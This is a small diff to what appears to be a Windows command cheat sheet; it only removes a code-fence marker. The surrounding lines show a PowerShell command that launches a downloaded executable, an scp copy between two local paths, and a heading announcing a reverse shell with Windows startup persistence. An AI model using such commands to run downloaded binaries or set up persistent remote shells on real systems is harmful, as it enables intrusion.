@@ -22,7 +22,7 @@
 
 » Runs the program: powershell -c "Start-Process C:\Users\{Username}\Downloads\downloaded_file.exe"
 
-```d
+
 » Copies the file from one place to another: scp C:\Users\Administrator\Downloads\program.exe C:\Users\Administrator\Desktop\program.exe
 ```
 » Reverse shell + Windows Startup
